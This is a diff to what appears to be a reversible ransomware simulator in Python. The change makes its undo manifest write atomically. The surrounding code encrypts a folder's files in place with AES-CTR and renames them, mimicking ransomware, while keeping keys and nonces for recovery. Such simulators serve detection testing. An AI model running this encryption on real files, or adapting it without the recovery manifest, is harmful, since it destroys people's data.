@@ -29,7 +29,10 @@ def check_target(folder: str) -> Path:
 def manifest_path(target: Path) -> Path:
     return KEY_DIR / f"{target.name}_manifest.json"
 
-
+def save_manifest(mpath: Path, manifest: dict):
+    tmp = mpath.with_suffix(".tmp")
+    tmp.write_text(json.dumps(manifest, indent=1))
+    os.replace(tmp, mpath)          # atomic: the manifest is never half-written
 def encrypt(target: Path, delay: float, partial: int | None, note: bool):
     KEY_DIR.mkdir(parents=True, exist_ok=True)
     mpath = manifest_path(target)
@@ -54,8 +57,7 @@ def encrypt(target: Path, delay: float, partial: int | None, note: bool):
         # 1) record everything needed to undo, BEFORE touching the file
         manifest["files"][str(dest)] = {"orig": str(p), "nonce": nonce.hex(),
                                         "n": n, "sha256": sha256(data)}
-        mpath.write_text(json.dumps(manifest, indent=1))
-
+        save_manifest(mpath, manifest)
         # 2) overwrite in place, then rename (typical ransomware behaviour)
         enc = aes_ctr(key, nonce).encryptor()
         p.write_bytes(enc.update(data[:n]) + enc.finalize() + data[n:])
